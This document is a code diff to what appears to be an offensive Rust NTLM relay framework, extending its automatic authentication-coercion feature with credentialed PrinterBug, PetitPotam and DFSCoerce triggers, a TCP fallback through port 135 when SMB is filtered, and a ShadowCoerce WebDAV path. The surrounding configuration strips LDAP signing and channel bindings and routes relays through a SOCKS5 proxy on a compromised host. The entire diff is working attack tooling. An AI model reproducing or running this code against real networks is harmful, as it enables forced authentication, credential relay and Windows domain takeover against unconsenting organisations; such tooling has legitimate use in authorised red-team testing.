@@ -12,6 +12,7 @@ pub mod poisoner;
 pub mod relay;
 pub mod responder;
 pub mod smb_daemon;
+pub mod tls;
 pub mod tls_relay;
 pub mod utils;
 
@@ -27,13 +28,17 @@ pub use tls_relay::{CbtMode, TlsRelay, TlsRelayConfig};
 use futures::stream::{FuturesUnordered, StreamExt};
 pub use overthrone_core::error::RelayError;
 use overthrone_core::error::Result;
-use overthrone_core::proto::{trigger_dfs_coerce, trigger_petitpotam, trigger_printer_bug};
-use std::net::SocketAddr;
+use overthrone_core::proto::coerce::{CoerceCreds, CoerceProtocol};
+use overthrone_core::proto::{
+    trigger_coerce_tcp, trigger_dfs_coerce, trigger_dfs_coerce_ex, trigger_petitpotam,
+    trigger_petitpotam_ex, trigger_printer_bug, trigger_printer_bug_ex,
+};
+use std::net::{SocketAddr, TcpStream};
 use std::sync::Arc;
-use std::time::Duration;
+use std::time::{Duration, Instant};
 use tokio::sync::Mutex as TokioMutex;
 use tokio::time::sleep;
-use tracing::{info, warn};
+use tracing::{debug, info, warn};
 
 /// Protocol for relay targets
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -179,8 +184,10 @@ pub struct RelayControllerConfig {
     /// Strips SIGN/SEAL/ALWAYS_SIGN flags and channel bindings from
     /// NTLM challenge/authenticate during LDAP/LDAPS relay.
     pub ldap_signing_bypass: bool,
-    /// Optional mTLS client identity for outbound TLS connections.
-    pub tls_client_identity: Option<crate::relay::TlsIdentity>,
+    /// Shared TLS configuration (verification mode + optional mTLS identity).
+    /// Default: `None` means `TlsConfig::relay_default()` (AcceptAll mode, no client cert).
+    /// Set to `Some(TlsConfig::verify_server(...))` to validate server certificates.
+    pub tls_config: Option<tls::TlsConfig>,
     /// Optional SOCKS5 proxy for outbound relay connections (format: `host:port`).
     /// When set, all outbound NTLM relay connections route through this SOCKS5 proxy
     /// instead of connecting directly. Useful for pivoting through a compromised host.
@@ -214,6 +221,10 @@ pub struct RelayControllerConfig {
     pub auto_coerce_mode: String,
     /// Maximum retries per technique when auto_coerce_mode is "aggressive"
     pub auto_coerce_max_retries: u32,
+    /// Optional credentials for coercion triggers.
+    /// When `None`, uses SMB null session fallback.
+    /// When `Some`, uses these credentials for authenticated SMB binds.
+    pub auto_coerce_credentials: Option<CoerceCreds>,
 }
 
 impl Default for RelayControllerConfig {
@@ -231,7 +242,7 @@ impl Default for RelayControllerConfig {
             downgrade_auth: false,
             no_poison: false,
             ldap_signing_bypass: true,
-            tls_client_identity: None,
+            tls_config: None,
             socks5_proxy: None,
             auto_coerce_targets: Vec::new(),
             auto_coerce_listener: None,
@@ -239,6 +250,7 @@ impl Default for RelayControllerConfig {
             auto_coerce_parallel: false,
             auto_coerce_mode: "all".to_string(),
             auto_coerce_max_retries: 1,
+            auto_coerce_credentials: None,
             tls_relay_config: None,
         }
     }
@@ -318,7 +330,7 @@ impl RelayController {
                 ldap_signing_bypass: self.config.ldap_signing_bypass,
                 max_retries: 3,
                 max_connections: 64,
-                tls_client_identity: self.config.tls_client_identity.clone(),
+                tls_config: self.config.tls_config.clone(),
                 socks5_proxy: self.config.socks5_proxy.clone(),
             };
             let ntlm_relay = relay::NtlmRelay::new(relay_config);
@@ -411,6 +423,7 @@ impl RelayController {
     /// Automatically trigger coercion against configured targets.
     /// Respects `auto_coerce_mode`, `auto_coerce_parallel`, and `auto_coerce_max_retries`.
     /// Supports PrinterBug (stealth), PetitPotam, DFSCoerce, and ShadowCoerce via WebDAV.
+    /// Waits for listener readiness before firing, and uses configured credentials if available.
     async fn auto_coerce(&self) {
         let listener = match &self.config.auto_coerce_listener {
             Some(ip) => ip.clone(),
@@ -424,6 +437,12 @@ impl RelayController {
             Some(http) => http.listen_port,
             None => 445,
         };
+
+        // Wait for listeners to be ready before firing
+        wait_for_listener_ready(port, Duration::from_secs(10)).await;
+        if self.config.http_relay_config.is_some() {
+            wait_for_listener_ready(port, Duration::from_secs(10)).await;
+        }
 
         // Determine techniques based on mode
         let technique_names: Vec<&str> = match self.config.auto_coerce_mode.as_str() {
@@ -441,12 +460,16 @@ impl RelayController {
             1
         };
 
+        let has_http = self.config.http_relay_config.is_some();
+        let creds = self.config.auto_coerce_credentials.clone();
+
         info!(
-            "Auto-coercing {} target(s) | mode={} | parallel={} | max_retries={}",
+            "Auto-coercing {} target(s) | mode={} | parallel={} | max_retries={} | creds={}",
             self.config.auto_coerce_targets.len(),
             self.config.auto_coerce_mode,
             self.config.auto_coerce_parallel,
             max_retries,
+            creds.is_some(),
         );
 
         if self.config.auto_coerce_parallel {
@@ -456,12 +479,13 @@ impl RelayController {
                 .iter()
                 .map(|target| {
                     let t = target.clone();
+                    let l = listener.clone();
                     let smb = smb_listener.clone();
                     let webdav = webdav_listener.clone();
                     let tn = technique_names.clone();
-                    let has_http = self.config.http_relay_config.is_some();
+                    let c = creds.clone();
                     async move {
-                        coerce_target(&t, &smb, &webdav, &tn, max_retries, has_http).await
+                        coerce_target_ex(&t, &l, &smb, &webdav, &tn, max_retries, has_http, c).await
                     }
                 })
                 .collect();
@@ -470,13 +494,15 @@ impl RelayController {
             }
         } else {
             for target in &self.config.auto_coerce_targets {
-                let result = coerce_target(
+                let result = coerce_target_ex(
                     target,
+                    &listener,
                     &smb_listener,
                     &webdav_listener,
                     &technique_names,
                     max_retries,
-                    self.config.http_relay_config.is_some(),
+                    has_http,
+                    creds.clone(),
                 )
                 .await;
                 info!("{}", result);
@@ -539,18 +565,23 @@ impl RelayController {
     }
 }
 
-/// Coerce a single target using the specified techniques with retry and WebDAV fallback.
-async fn coerce_target(
+/// Coerce a single target using the specified techniques with retry, TCP fallback, and WebDAV fallback.
+/// Uses optional credentials when provided (otherwise SMB null session).
+#[allow(clippy::too_many_arguments)]
+async fn coerce_target_ex(
     target: &str,
+    listener_ip: &str,
     smb_listener: &str,
     webdav_listener: &str,
     techniques: &[&str],
     max_retries: u32,
     has_http_relay: bool,
+    creds: Option<CoerceCreds>,
 ) -> String {
     let mut summary = String::new();
+    let creds_ref = creds.as_ref();
     for &technique in techniques {
-        let (listener, desc) = match technique {
+        let (pipe_listener, desc) = match technique {
             "printer-bug" => (smb_listener, "PrinterBug"),
             "petitpotam" => (smb_listener, "PetitPotam"),
             "dfs-coerce" => (smb_listener, "DFSCoerce"),
@@ -560,9 +591,18 @@ async fn coerce_target(
         let attempts = if max_retries > 1 { max_retries } else { 1 };
         for attempt in 1..=attempts {
             let result = match technique {
-                "printer-bug" => trigger_printer_bug(target, listener).await,
-                "petitpotam" => trigger_petitpotam(target, listener).await,
-                "dfs-coerce" => trigger_dfs_coerce(target, listener).await,
+                "printer-bug" => match creds_ref {
+                    Some(c) => trigger_printer_bug_ex(target, pipe_listener, Some(c)).await,
+                    None => trigger_printer_bug(target, pipe_listener).await,
+                },
+                "petitpotam" => match creds_ref {
+                    Some(c) => trigger_petitpotam_ex(target, pipe_listener, Some(c)).await,
+                    None => trigger_petitpotam(target, pipe_listener).await,
+                },
+                "dfs-coerce" => match creds_ref {
+                    Some(c) => trigger_dfs_coerce_ex(target, pipe_listener, Some(c)).await,
+                    None => trigger_dfs_coerce(target, pipe_listener).await,
+                },
                 _ => continue,
             };
             match result {
@@ -593,6 +633,25 @@ async fn coerce_target(
             }
         }
     }
+    // TCP fallback: if all named pipe techniques failed, try TCP-based coercion
+    // via EPM (port 135) resolution — works when SMB port 445 is filtered
+    if !summary.contains("OK") {
+        let tcp_protocols: &[(CoerceProtocol, &str)] = &[
+            (CoerceProtocol::Rprn, "PrinterBug-TCP"),
+            (CoerceProtocol::EfsRpc, "PetitPotam-TCP"),
+            (CoerceProtocol::EfsBackup, "DFSCoerce-TCP"),
+        ];
+        for &(protocol, desc) in tcp_protocols {
+            match trigger_coerce_tcp(target, listener_ip, protocol).await {
+                Ok(r) if r.success => {
+                    summary.push_str(&format!("[{target}] {desc} OK. "));
+                    break;
+                }
+                Ok(r) => warn!("[{target}] {desc} failed: {}", r.message),
+                Err(e) => warn!("[{target}] {desc} error: {e}"),
+            }
+        }
+    }
     // WebDAV fallback via PrinterBug when HTTP relay is active
     if has_http_relay {
         match trigger_printer_bug(target, webdav_listener).await {
@@ -600,11 +659,45 @@ async fn coerce_target(
             Ok(r) => warn!("[{target}] WebDAV/PrinterBug failed: {}", r.message),
             Err(e) => warn!("[{target}] WebDAV/PrinterBug error: {e}"),
         }
+        // ShadowCoerce: PetitPotam over WebDAV trick
+        match trigger_petitpotam(target, webdav_listener).await {
+            Ok(r) if r.success => {
+                summary.push_str(&format!("[{target}] ShadowCoerce/PetitPotam-WebDAV OK. "))
+            }
+            Ok(r) => debug!(
+                "[{target}] ShadowCoerce/PetitPotam-WebDAV failed: {}",
+                r.message
+            ),
+            Err(e) => debug!("[{target}] ShadowCoerce/PetitPotam-WebDAV error: {e}"),
+        }
     }
     if summary.is_empty() {
         summary = format!("[{target}] all techniques failed");
     }
     summary
+}
+
+/// Wait until a TCP port is accepting connections (listener readiness check).
+/// Retries with backoff up to `timeout` duration.
+async fn wait_for_listener_ready(port: u16, timeout: Duration) {
+    let start = Instant::now();
+    let mut delay = Duration::from_millis(100);
+    while start.elapsed() < timeout {
+        match TcpStream::connect_timeout(
+            &format!("127.0.0.1:{port}").parse().unwrap(),
+            Duration::from_millis(200),
+        ) {
+            Ok(_) => {
+                debug!("Listener ready on port {port}");
+                return;
+            }
+            Err(_) => {
+                sleep(delay).await;
+                delay = (delay * 2).min(Duration::from_secs(1));
+            }
+        }
+    }
+    warn!("Listener on port {port} not ready after {timeout:?}, proceeding anyway");
 }
 
 /// Quick start function for common use case (poison + capture)
@@ -622,7 +715,7 @@ pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<R
         downgrade_auth: false,
         no_poison: false,
         ldap_signing_bypass: true,
-        tls_client_identity: None,
+        tls_config: None,
         socks5_proxy: None,
         auto_coerce_targets: Vec::new(),
         auto_coerce_listener: None,
@@ -630,6 +723,7 @@ pub async fn run_responder(interface: &str, challenge: Option<&str>) -> Result<R
         auto_coerce_parallel: false,
         auto_coerce_mode: "all".to_string(),
         auto_coerce_max_retries: 1,
+        auto_coerce_credentials: None,
         tls_relay_config: None,
     };
 
@@ -659,7 +753,7 @@ pub async fn run_relay_attack(
         downgrade_auth: false,
         no_poison: false,
         ldap_signing_bypass: true,
-        tls_client_identity: None,
+        tls_config: None,
         socks5_proxy: None,
         auto_coerce_targets: Vec::new(),
         auto_coerce_listener: None,
@@ -667,6 +761,7 @@ pub async fn run_relay_attack(
         auto_coerce_parallel: false,
         auto_coerce_mode: "all".to_string(),
         auto_coerce_max_retries: 1,
+        auto_coerce_credentials: None,
         tls_relay_config: None,
     };
 
@@ -696,7 +791,7 @@ pub async fn run_http_asymmetric_relay(
         downgrade_auth: false,
         no_poison: true,
         ldap_signing_bypass: true,
-        tls_client_identity: None,
+        tls_config: None,
         socks5_proxy: socks5_proxy.clone(),
         auto_coerce_targets: Vec::new(),
         auto_coerce_listener: None,
@@ -712,6 +807,7 @@ pub async fn run_http_asymmetric_relay(
         auto_coerce_parallel: false,
         auto_coerce_mode: "all".to_string(),
         auto_coerce_max_retries: 1,
+        auto_coerce_credentials: None,
         tls_relay_config: None,
     };
 
@@ -875,7 +971,7 @@ mod tests {
             downgrade_auth: false,
             no_poison: true,
             ldap_signing_bypass: true,
-            tls_client_identity: None,
+            tls_config: None,
             socks5_proxy: None,
             auto_coerce_targets: Vec::new(),
             auto_coerce_listener: None,
@@ -883,6 +979,7 @@ mod tests {
             auto_coerce_parallel: false,
             auto_coerce_mode: "all".to_string(),
             auto_coerce_max_retries: 1,
+            auto_coerce_credentials: None,
             tls_relay_config: None,
         };
         assert_eq!(config.auto_coerce_mode, "all");
